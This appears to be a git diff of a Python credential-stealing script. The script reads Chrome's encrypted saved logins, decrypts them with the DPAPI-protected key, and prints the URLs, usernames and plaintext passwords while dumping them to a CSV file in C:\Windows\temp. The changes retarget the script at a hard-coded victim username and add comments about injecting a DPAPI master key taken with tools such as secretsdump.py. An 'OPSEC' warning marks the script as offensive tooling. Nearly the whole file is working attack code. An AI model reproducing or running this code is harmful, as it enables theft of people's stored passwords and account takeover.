@@ -9,9 +9,14 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 
+username = "joebob"
+writepath = "C:\\Windows\\temp\\decrypted_passwords.csv"
+
 #GLOBAL CONSTANT
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\\Local\\Google\\Chrome\\User Data\\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\\Local\\Google\\Chrome\\User Data"%(os.environ['USERPROFILE']))
+# Path of the "Local State file"
+CHROME_PATH_LOCAL_STATE = f"C:\\Users\\{username}\\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
+# Path of the User Data directory.
+CHROME_PATH = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data"
 
 def get_secret_key():
     try:
@@ -21,18 +26,19 @@ def get_secret_key():
             local_state = json.loads(local_state)
         secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         #Remove suffix DPAPI
+
+        # ---- import key DPAPI master key here ----
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-        print(f"Secret key: {secret_key}") # Can we directly input our DPAPI master key here? 
+        # ---- End master key DPAPI import -----
+        print(f"Secret key: {secret_key}") # Can we directly input our DPAPI master key here? dpapi.py secretsdump.py?
+        # Might need to format the key in the specified format. 
         return secret_key
     except Exception as e:
         print("%s"%str(e))
         print("[ERR] Chrome secretkey cannot be found")
         return None
     
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
-
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
 
@@ -45,7 +51,7 @@ def decrypt_password(ciphertext, secret_key):
         encrypted_password = ciphertext[15:-16]
         #(4) Build the cipher to decrypt the ciphertext
         cipher = generate_cipher(secret_key, initialisation_vector)
-        decrypted_pass = decrypt_payload(cipher, encrypted_password) 
+        decrypted_pass = cipher.decrypt(encrypted_password)
         decrypted_pass = decrypted_pass.decode()  
         return decrypted_pass
     except Exception as e:
@@ -67,8 +73,8 @@ if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
         print("*" * 10 + "WARNING! THIS SCRIPT WRITES TO DISK! NOT OPSEC SAFE! " + "*" * 10)
-        print("Writing to C:\\Windows\\temp\\decrypted_passwords.csv")
-        with open('C:\\Windows\\temp\\decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        print(f"Writing file to : {writepath}")
+        with open(writepath, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
@@ -83,13 +89,14 @@ if __name__ == '__main__':
                     cursor = conn.cursor()
                     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                     for index,login in enumerate(cursor.fetchall()):
+                        print(f"Login (full) : {login}")
                         url = login[0]
                         username = login[1]
                         ciphertext = login[2]
                         decrypted_password = decrypt_password(ciphertext, secret_key)
                         print("Sequence: %d"%(index))
                         print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
-                        print("*"*50)
+                        print("*"*30)
                         #(5) Save into CSV 
                         csv_writer.writerow([index,url,username,decrypted_password])
                     #Close database connection
